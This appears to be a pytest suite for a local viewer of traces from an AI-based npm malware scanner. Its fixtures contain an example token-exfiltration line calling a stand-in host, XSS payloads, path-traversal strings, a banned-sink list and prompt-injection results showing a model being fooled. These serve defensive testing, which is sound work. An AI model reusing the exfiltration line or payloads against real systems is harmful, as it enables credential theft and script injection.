import json
from http.client import HTTPConnection
from pathlib import Path
from threading import Thread
from urllib.parse import quote

import pytest

from agent.trace import TraceWriter, trace_filename
from viewer.server import make_server


@pytest.fixture
def viewer(tmp_path):
    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server, tmp_path / "reports"
    server.shutdown()
    server.server_close()
    thread.join(timeout=2)


def request(server, method, target):
    connection = HTTPConnection("127.0.0.1", server.server_port, timeout=2)
    connection.request(method, target)
    response = connection.getresponse()
    result = response.status, dict(response.getheaders()), response.read()
    connection.close()
    return result


def test_loopback_static_headers_head_and_methods(viewer):
    server, _ = viewer
    assert server.server_address[0] == "127.0.0.1"
    status, headers, body = request(server, "GET", "/")
    assert status == 200 and b"Trace agent npm" in body
    assert headers["Content-Security-Policy"] == "default-src 'self'"
    assert headers["X-Content-Type-Options"] == "nosniff"
    status, headers, body = request(server, "HEAD", "/")
    assert status == 200 and body == b"" and int(headers["Content-Length"]) > 0
    for method in ("POST", "PUT", "OPTIONS", "TRACE"):
        status, headers, _ = request(server, method, "/api/runs")
        assert status == 405 and headers["Allow"] == "GET, HEAD"
    assert request(server, "GET", "/viewer/")[0] == 404


def test_runs_packages_and_events_after_sequence(viewer):
    server, reports = viewer
    package = "@scope/demo@1.0.0"
    writer = TraceWriter(reports / "run-1", package)
    writer.emit("run_start", model="qwen3.5:4b", config_name="A-SLM", max_steps=15)
    writer.emit("tool_call", tool="read_file", args={"file": "setup.js"})
    writer.emit("tool_result", tool="read_file", ok=True, summary="OK", data_preview="// safe",
                untrusted=True, duration_ms=2)
    writer.emit("verdict", verdict={"label": "benign", "confidence": 0.91}, valid=True,
                validation_errors=[])
    writer.emit("decision", final_label="benign", final_action=None, dry_run=None)
    writer.emit("run_end", elapsed_s=1.5, steps=2)

    status, _, body = request(server, "GET", "/api/runs")
    assert status == 200 and {"run-1", "sample_traces"} <= set(json.loads(body))
    status, _, body = request(server, "GET", "/api/runs/run-1/packages")
    assert status == 200
    assert json.loads(body) == [{"package": package, "model": "qwen3.5:4b", "label": "benign",
                                 "action": None, "rule": None, "proposal_label": "benign", "proposal_action": None,
                                 "evidence_total": 0, "evidence_ok": 0,
                                 "confidence": 0.91, "steps": 2, "elapsed_s": 1.5,
                                 "valid_json": True, "status": "done"}]
    target = f"/api/trace?run=run-1&pkg={quote(package, safe='')}&after=1"
    status, _, body = request(server, "GET", target)
    assert status == 200 and [event["seq"] for event in json.loads(body)] == [2, 3, 4, 5]


def test_rejects_traversal_and_invalid_queries(viewer):
    server, _ = viewer
    for target in (
        "/api/runs/../packages", "/api/runs/%2e%2e/packages",
        "/api/runs/%2fetc/packages", "/api/runs/C:%5cWindows/packages",
        "/api/trace?run=%2e%2e&pkg=demo@1.0.0&after=-1",
        "/api/trace?run=sample_traces&pkg=%2e%2e&after=-1",
        "/api/trace?run=sample_traces&pkg=demo@1.0.0&after=-2",
    ):
        assert request(server, "GET", target)[0] == 400


def test_symlink_cannot_escape_reports(viewer, tmp_path):
    server, reports = viewer
    reports.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    link = reports / "linked-run"
    try:
        link.symlink_to(outside, target_is_directory=True)
    except OSError as error:
        pytest.skip(f"symlinks unavailable: {error}")
    assert request(server, "GET", "/api/runs/linked-run/packages")[0] == 400
    assert "linked-run" not in json.loads(request(server, "GET", "/api/runs")[2])

    run = reports / "run-2"
    run.mkdir()
    package = "demo@1.0.0"
    (outside / "trace.jsonl").write_text("{}\n", encoding="utf-8")
    (run / trace_filename(package)).symlink_to(outside / "trace.jsonl")
    target = f"/api/trace?run=run-2&pkg={quote(package, safe='')}&after=-1"
    assert request(server, "GET", target)[0] == 400


def test_bundled_demo_is_visible_with_default_static_files(tmp_path):
    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        assert request(server, "GET", "/")[0] == 200
        status, _, body = request(server, "GET", "/api/runs/sample_traces/packages")
        assert status == 200 and len(json.loads(body)) == 4
        package = "comment-injection-demo@1.0.0"
        target = f"/api/trace?run=sample_traces&pkg={quote(package, safe='')}&after=-1"
        status, _, body = request(server, "GET", target)
        assert status == 200
        assert "<img src=x onerror=alert(1)>" in body.decode("utf-8")
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_samples_directory_cannot_be_used_as_reports_root():
    forbidden = Path(__file__).parents[1] / "data" / "samples"
    with pytest.raises(ValueError, match="data/samples"):
        make_server(forbidden, 0)


def test_ui_assets_are_served_and_never_parse_trace_as_html(viewer):
    server, _ = viewer
    for js_path in ("/app.js", "/summary.mjs", "/ui.mjs"):
        status, headers, body = request(server, "GET", js_path)
        assert status == 200 and headers["Content-Type"].startswith("text/javascript"), js_path
        source = body.decode("utf-8")
        for sink in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function"):
            assert sink not in source, f"{js_path} uses {sink}"
    assert "textContent" in request(server, "GET", "/app.js")[2].decode("utf-8")
    status, headers, _ = request(server, "GET", "/style.css")
    assert status == 200 and headers["Content-Type"].startswith("text/css")
    _, _, page = request(server, "GET", "/")
    assert b'src="/app.js"' in page and b"<script>" not in page


# --- 3D office (KE_HOACH_VAN_PHONG_3D.md) --------------------------------------------------------
STATIC_ROOT = Path(__file__).resolve().parent.parent / "viewer" / "static"


def test_office_page_and_modules_are_served_with_strict_csp(viewer):
    server, _ = viewer
    status, headers, body = request(server, "GET", "/office")
    assert status == 200 and b"/office/main.mjs" in body
    assert headers["Content-Security-Policy"] == "default-src 'self'"
    for path in ("/office/main.mjs", "/office/scene.mjs", "/office/events.mjs", "/office/explain.mjs",
                 "/vendor/three.module.min.js", "/vendor/OrbitControls.js"):
        status, headers, _ = request(server, "GET", path)
        assert status == 200 and headers["Content-Type"].startswith("text/javascript"), path
    # Only whitelisted files: no directory walking into vendor/ or office/.
    for path in ("/vendor/LICENSE", "/vendor/README.md", "/office/", "/office/../server.py", "/vendor/%2e%2e/app.js"):
        assert request(server, "GET", path)[0] == 404, path


def test_office_sources_never_inject_trace_text_as_html():
    """O-3 groundwork: trace strings are untrusted and must reach the page with textContent only."""
    sources = [*(STATIC_ROOT / "office").glob("*.mjs"), STATIC_ROOT / "office.html"]
    for source in sources:
        text = source.read_text(encoding="utf-8")
        for banned in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "eval(", "new Function"):
            assert banned not in text, f"{source.name} uses {banned}"
    assert "<script>" not in (STATIC_ROOT / "office.html").read_text(encoding="utf-8")  # CSP forbids inline


def test_vendored_three_matches_recorded_hashes():
    import hashlib

    readme = (STATIC_ROOT / "vendor" / "README.md").read_text(encoding="utf-8")
    for name in ("three.module.min.js", "LICENSE"):
        digest = hashlib.sha256((STATIC_ROOT / "vendor" / name).read_bytes()).hexdigest()
        assert digest in readme, name
    patched = hashlib.sha256((STATIC_ROOT / "vendor" / "OrbitControls.js").read_bytes()).hexdigest()
    assert f"SHA-256 sau sửa: `{patched}`" in readme


def test_reference_labels_api_reads_only_valid_rows(tmp_path):
    labels = tmp_path / "labels.csv"
    labels.write_text("id,name,version,label,behavior_main\n"
                      "1,left-pad,1.3.0,benign,x\n"
                      "2,@scope/evil,0.1.0,malicious,y\n"
                      "3,bad name,1.0.0,malicious,z\n"
                      "4,odd,1.0.0,unknown,z\n", encoding="utf-8")
    server = make_server(tmp_path / "reports", 0, labels_file=labels)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", "/api/labels")
        assert status == 200
        assert json.loads(body) == {"left-pad@1.3.0": "benign", "@scope/evil@0.1.0": "malicious"}
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_reference_labels_missing_file_is_empty(tmp_path):
    from viewer.server import reference_labels
    assert reference_labels(tmp_path / "missing.csv") == {}


def test_bundled_base64_sample_is_decoded_for_display_only(tmp_path):
    """The sample stays base64 on disk; the API returns the decoded text, which the page shows with textContent."""
    sample_dir = Path(__file__).parents[1] / "viewer" / "sample_traces"
    package = "base64-preview-demo@1.0.0"
    on_disk = (sample_dir / trace_filename(package)).read_text(encoding="utf-8")
    assert "<img src=x onerror=alert(1)>" not in on_disk and "data_preview_b64" in on_disk
    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", f"/api/trace?run=sample_traces&pkg={quote(package, safe='')}&after=-1")
        assert status == 200
        events = json.loads(body)
        results = [event for event in events if event["type"] == "tool_result"]
        assert all(not key.endswith(("_b64", "_encoding")) for event in events for key in event)
        assert "<img src=x onerror=alert(1)>" in results[-1]["data_preview"]
        assert "writeFileSync" in results[-1]["data_preview"]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_encoded_free_text_fields_are_decoded_recursively(tmp_path):
    """Gate B0 21/11: every free-text field may be `<field>_b64` + "base64" or "base64-json" (nested, or null)."""
    from experiments.encoding import encode_event
    run_dir = tmp_path / "reports" / "run-enc"
    run_dir.mkdir(parents=True)
    package = "enc-demo@1.0.0"
    verdict = {"package": package, "label": "malicious", "confidence": 0.9, "action": "deny",
               "description": "Đọc ~/.npmrc rồi gửi đi",
               "behaviors": [{"behavior": "gửi token", "severity": "high", "evidence": {"file": "a.js", "lines": "3"},
                              "analysis": "<script>alert(1)</script>"}]}
    plain = [
        {"type": "run_start", "model": "m", "max_steps": 15},
        {"type": "thought", "text": "Mô hình nghĩ: đọc a.js trước"},
        {"type": "tool_call", "tool": "read_file", "args": {"file": "a.js", "start": 1, "end": 5}},
        {"type": "tool_result", "tool": "read_file", "ok": True, "summary": "OK", "untrusted": True,
         "data_preview": "fetch('https://x.invalid/?t=' + process.env.NPM_TOKEN)"},
        {"type": "verdict", "verdict": verdict, "valid": True, "validation_errors": []},
        {"type": "decision", "final_label": "malicious", "final_action": "deny", "rule": "R6", "dry_run": True,
         "reasons": ["Verified malicious behavior"], "evidence_checks": [{"file": "a.js", "lines": "3", "exists": True}],
         "inputs": None},
        {"type": "run_end", "elapsed_s": 1.0, "steps": 2},
    ]
    lines = []
    for seq, event in enumerate(plain):
        record = {**event, "run_id": "run-enc", "package": package, "seq": seq}
        # an old plain event in the same file must still pass through untouched
        lines.append(json.dumps(record if seq == 1 else encode_event(record), ensure_ascii=False))
    (run_dir / trace_filename(package)).write_text("\n".join(lines) + "\n", encoding="utf-8")
    raw = (run_dir / trace_filename(package)).read_text(encoding="utf-8")
    assert "base64-json" in raw and "NPM_TOKEN" not in raw and "<script>" not in raw

    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", f"/api/trace?run=run-enc&pkg={quote(package, safe='')}&after=-1")
        assert status == 200
        events = json.loads(body)
        for got, want in zip(events, plain):
            assert {key: got[key] for key in want} == want
        assert events[4]["verdict"]["behaviors"][0]["analysis"] == "<script>alert(1)</script>"
        assert events[5]["inputs"] is None
        status, _, body = request(server, "GET", "/api/runs/run-enc/packages")
        [item] = json.loads(body)
        assert (item["label"], item["action"], item["rule"], item["proposal_label"], item["evidence_ok"]) ==             ("malicious", "deny", "R6", "malicious", 1)
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_undecodable_field_drops_only_its_line(tmp_path):
    run_dir = tmp_path / "reports" / "run-bad"
    run_dir.mkdir(parents=True)
    package = "bad-enc@1.0.0"
    good = {"type": "run_start", "model": "m", "max_steps": 1, "run_id": "run-bad", "package": package, "seq": 0}
    bad = {"type": "thought", "text_b64": "abc", "text_encoding": "base64", "run_id": "run-bad", "package": package, "seq": 1}
    odd = {"type": "thought", "text_b64": "eA==", "text_encoding": "rot13", "run_id": "run-bad", "package": package, "seq": 2}
    (run_dir / trace_filename(package)).write_text("".join(json.dumps(e) + "\n" for e in (good, bad, odd)), encoding="utf-8")
    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", f"/api/trace?run=run-bad&pkg={quote(package, safe='')}&after=-1")
        assert status == 200 and [event["seq"] for event in json.loads(body)] == [0]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_isolated_run_id_is_accepted_while_foreign_run_id_is_rejected(tmp_path):
    """T1 step 1: isolated container traces carry run_id='run'; foreign run_ids must still be ignored."""
    run_dir = tmp_path / "reports" / "test-v1-a-llm-x"
    run_dir.mkdir(parents=True)
    iso_pkg = "esbuild@0.24.0"
    foreign_pkg = "left-pad@1.3.0"
    for pkg, trace_run_id in ((iso_pkg, "run"), (foreign_pkg, "some-other-run")):
        events = [
            {"type": "run_start", "model": "qwen3.5:9b", "max_steps": 15, "run_id": trace_run_id, "package": pkg, "seq": 0},
            {"type": "decision", "final_label": "benign", "final_action": "approve", "rule": "R7",
             "reasons": ["Verified"], "evidence_checks": [{"file": "install.js", "lines": "1", "exists": True}],
             "run_id": trace_run_id, "package": pkg, "seq": 1},
            {"type": "run_end", "elapsed_s": 1.2, "steps": 2, "run_id": trace_run_id, "package": pkg, "seq": 2},
        ]
        (run_dir / trace_filename(pkg)).write_text("".join(json.dumps(e) + "\n" for e in events), encoding="utf-8")

    server = make_server(tmp_path / "reports", 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", "/api/runs/test-v1-a-llm-x/packages")
        assert status == 200
        pkgs = json.loads(body)
        assert [item["package"] for item in pkgs] == [iso_pkg]

        status, _, body = request(server, "GET", f"/api/trace?run=test-v1-a-llm-x&pkg={quote(iso_pkg, safe='')}&after=-1")
        assert status == 200 and len(json.loads(body)) == 3

        status, _, body = request(server, "GET", f"/api/trace?run=test-v1-a-llm-x&pkg={quote(foreign_pkg, safe='')}&after=-1")
        assert status == 200 and json.loads(body) == []
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_run_summary_uses_metrics_score_and_compares_guarddog(tmp_path):
    labels = tmp_path / "labels.csv"
    labels.write_text(
        "id,name,version,label,behavior_main,technique,file,lines,source,split,cluster\n"
        "1,good-pkg,1.0.0,benign,none,print-output,index.js,1,https://registry.npmjs.org/x,test,c1\n"
        "2,evil-pkg,1.0.0,malicious,exfil,network-request,setup.js,2,https://raw.githubusercontent.com/x,test,c2\n"
        "3,dev-only,1.0.0,benign,none,print-output,index.js,1,https://registry.npmjs.org/y,dev,c3\n",
        encoding="utf-8",
    )
    reports = tmp_path / "reports"
    run_dir = reports / "test-run"
    run_dir.mkdir(parents=True)
    (run_dir / "run_meta.json").write_text(
        json.dumps({"model": "qwen3.5:9b", "config": {"name": "A-LLM-X", "deny_threshold": 0.95, "approve_threshold": 0.95}}),
        encoding="utf-8",
    )
    (run_dir / "good-pkg@1.0.0.json").write_text(json.dumps({
        "package": "good-pkg@1.0.0", "status": "ok", "steps": 2, "elapsed_s": 4.0,
        "decision": {"label": "suspicious", "action": "review", "rule": "R7_risk", "reasons": ["Unexplained line"]},
        "verdict_summary": {"label": "benign", "confidence": 0.95, "action": "approve"},
    }), encoding="utf-8")
    (run_dir / "evil-pkg@1.0.0.json").write_text(json.dumps({
        "package": "evil-pkg@1.0.0", "status": "ok", "steps": 3, "elapsed_s": 6.0,
        "decision": {"label": "malicious", "action": "deny", "rule": "R6", "reasons": ["Verified malicious"]},
        "verdict_summary": {"label": "malicious", "confidence": 0.95, "action": "deny"},
    }), encoding="utf-8")
    gd_dir = reports / "guarddog-v1" / "guarddog"
    gd_dir.mkdir(parents=True)
    (gd_dir / "good-pkg@1.0.0.json").write_text(json.dumps({"package": "good-pkg@1.0.0", "ok": True, "data": {"issues": 0}}), encoding="utf-8")
    (gd_dir / "evil-pkg@1.0.0.json").write_text(json.dumps({"package": "evil-pkg@1.0.0", "ok": True, "data": {"issues": 1}}), encoding="utf-8")

    server = make_server(reports, 0, labels_file=labels)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", "/api/runs/test-run/summary")
        assert status == 200
        data = json.loads(body)
        assert data["split"] == "test"
        assert data["metrics"]["scored"] == 2
        assert data["metrics"]["binary"] == {"tp": 1, "fp": 1, "tn": 0, "fn": 0}
        assert data["guarddog"]["binary"] == {"tp": 1, "fp": 0, "tn": 1, "fn": 0}
        assert [r["rule"] for r in data["rules"]] == ["R6", "R7_risk"]
        fp_case = next(c for c in data["cases"] if c["package"] == "good-pkg@1.0.0")
        assert "false_positive" in fp_case["kinds"] and "disagree" in fp_case["kinds"]
        assert request(server, "GET", "/api/runs/test-run/summary?split=bogus")[0] == 400
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_package_extra_reads_osv_and_sandbox_safely(tmp_path):
    reports = tmp_path / "reports"
    run_dir = reports / "run-x"
    ctx_dir = reports / "contexts-v1"
    sbx_dir = reports / "sbx-test-v1b" / "sandbox"
    for d in (run_dir, ctx_dir, sbx_dir):
        d.mkdir(parents=True)
    pkg = "@scope/demo@1.0.0"
    fname = "@scope__demo@1.0.0.json"
    (run_dir / "run_meta.json").write_text(json.dumps({"contexts": "reports/contexts-v1"}), encoding="utf-8")
    (run_dir / fname).write_text(json.dumps({"package": pkg, "status": "ok", "steps": 4, "elapsed_s": 5.0}), encoding="utf-8")
    (ctx_dir / fname).write_text(json.dumps({"package": pkg, "osv": {"ok": True, "data": {"malicious": True, "vulns": [{"id": "MAL-1", "summary": "bad"}]}}}), encoding="utf-8")
    (sbx_dir / fname).write_text(json.dumps({"package": pkg, "ok": True, "data": {"outcome": "ok", "canary_touched": ["ssh"], "behavior": {"connects": [], "persistence_writes": [], "process_tree": []}}}), encoding="utf-8")

    server = make_server(reports, 0)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", f"/api/package-extra?run=run-x&pkg={quote(pkg, safe='')}")
        assert status == 200
        extra = json.loads(body)
        assert extra["osv"]["used_in_run"] is True and extra["osv"]["malicious"] is True
        assert extra["sandbox"]["used_in_run"] is False and extra["sandbox"]["canary_touched"] == ["ssh"]
        assert request(server, "GET", "/api/package-extra?run=..&pkg=demo@1.0.0")[0] == 400
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


def test_benchmarks_endpoint_aggregates_tables(tmp_path: Path) -> None:
    reports = tmp_path / "reports"
    data_dir = tmp_path / "data"
    data_dir.mkdir()
    (data_dir / "labels-v1.csv").write_text(
        "id,name,version,label,behavior_main,technique,file,lines,source,split,cluster\n"
        "1,mal-a,1.0.0,malicious,dropper,dropper,index.js,1-2,npm,dev,c1\n"
        "2,ben-b,1.0.0,benign,,,,github,test,c2\n",
        encoding="utf-8",
    )
    (data_dir / "labels-v2-draft.csv").write_text(
        "id,name,version,label,behavior_main,technique,file,lines,source,split,cluster,time_split\n"
        "1,mal-a,1.0.0,malicious,dropper,dropper,index.js,1-2,npm,test,c1,after\n",
        encoding="utf-8",
    )

    test_sum = reports / "test-v1-summary"
    test_sum.mkdir(parents=True)
    (test_sum / "metrics-a-llm-x.json").write_text(
        json.dumps(
            {
                "scored": 300,
                "precision": 0.72,
                "recall": 0.98,
                "f1": 0.8302,
                "fpr": 0.41,
                "confusion": {"malicious": {"benign": 0}, "suspicious": {"benign": 1}},
            }
        ),
        encoding="utf-8",
    )
    gd_test = reports / "guarddog-test-v1"
    gd_test.mkdir(parents=True)
    (gd_test / "metrics.json").write_text(
        json.dumps({"scored": 300, "precision": 0.96, "recall": 0.81, "f1": 0.8835, "fpr": 0.0284}),
        encoding="utf-8",
    )

    osv_dir = reports / "osv-ablation-v1"
    osv_dir.mkdir(parents=True)
    (osv_dir / "test-a-llm-x.json").write_text(
        json.dumps(
            {
                "without_osv": {"scored": 300, "f1": 0.8257, "precision": 0.71, "recall": 0.97, "fpr": 0.42},
                "with_osv": {"scored": 300, "f1": 0.8302, "precision": 0.72, "recall": 0.98, "fpr": 0.41},
                "changed": [{"package": "mal-a@1.0.0"}],
            }
        ),
        encoding="utf-8",
    )
    (osv_dir / "test-osv-only.json").write_text(
        json.dumps({"osv_only": {"scored": 300, "f1": 0.65, "precision": 1.0, "recall": 0.48, "fpr": 0.0}}),
        encoding="utf-8",
    )

    sbx_dir = reports / "sbx-test-v1b" / "sandbox"
    sbx_dir.mkdir(parents=True)
    (sbx_dir / "ok@1.0.0.json").write_text(
        json.dumps({"data": {"outcome": "ok", "script_ran": True, "canary_touched": ["npmrc"]}}),
        encoding="utf-8",
    )
    (sbx_dir / "bad@1.0.0.json").write_text(
        json.dumps({"fail_reason": "not_started", "dependencies": {"ok": False, "error": "npm error code EBADPLATFORM"}}),
        encoding="utf-8",
    )

    dev_sum = reports / "dev-v1-summary"
    dev_sum.mkdir(parents=True)
    (dev_sum / "sweep-a-llm-x.md").write_text(
        "| Ngưỡng | Precision | Recall | F1 | FPR | Tỉ lệ review | Malicious approved |\n"
        "| --- | --- | --- | --- | --- | --- | --- |\n"
        "| 0.80 (chọn) | 0.7000 | 0.9600 | 0.8100 | 0.3500 | 0.2500 | 0 |\n",
        encoding="utf-8",
    )

    (reports / "inj1109b-summary.json").write_text(
        json.dumps(
            {
                "lure": "IGNORE",
                "placements": {
                    "comment": {
                        "what": "inside comment",
                        "models": {
                            "A-TLM-X": {"run_id": "inj-tlm", "n": 9, "model_fooled": 5, "system_fooled": 0, "denied": 0, "review": 9},
                        },
                    }
                },
            }
        ),
        encoding="utf-8",
    )
    (reports / "corpus-v2-summary.json").write_text(
        json.dumps(
            {
                "A-LLM": {
                    "total": 22,
                    "safe": 22,
                    "strict_correct": 18,
                    "malicious_denied": 11,
                    "n_malicious": 11,
                    "malicious_approved": 0,
                    "benign_denied": 0,
                    "pairs_separated": 9,
                    "n_pairs": 9,
                }
            }
        ),
        encoding="utf-8",
    )

    server = make_server(reports, 0, labels_file=data_dir / "labels-v1.csv")
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        status, _, body = request(server, "GET", "/api/benchmarks")
        assert status == 200
        payload = json.loads(body)
        assert [c["config"] for c in payload["comparisons"]["test"]] == ["A-LLM-X", "GuardDog 2.6.0"]
        assert payload["comparisons"]["test"][0]["malicious_approved"] == 0
        assert payload["comparisons"]["test"][0]["confusion"]["malicious"]["benign"] == 0
        assert len(payload["osv_ablation"]["test"]) == 2
        assert payload["sandbox"]["splits"]["test"]["canary_touched"] == 1
        assert payload["sandbox"]["missing_groups"][3]["total"] == 1
        assert payload["sweeps"][0]["config"] == "A-LLM-X"
        assert payload["sweeps"][0]["rows"][0]["selected"] is True
        assert [d["name"] for d in payload["datasets"]] == ["labels-v1", "labels-v2-draft"]
        assert payload["datasets"][1]["test_after"] == 1
        assert payload["prompt_injection"]["placements"][0]["models"]["A-TLM-X"]["system_fooled"] == 0
        assert payload["anti_rote"][0]["pairs_separated"] == 9
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)
